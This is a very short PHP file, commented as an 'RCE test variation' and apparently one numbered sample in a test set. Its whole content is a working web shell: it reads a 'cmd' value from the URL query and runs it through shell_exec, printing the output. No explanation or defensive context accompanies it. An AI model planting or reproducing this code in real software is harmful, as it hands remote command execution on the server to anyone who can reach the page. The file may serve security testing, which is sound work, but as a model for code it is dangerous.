<?php
// RCE test variation #1430
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>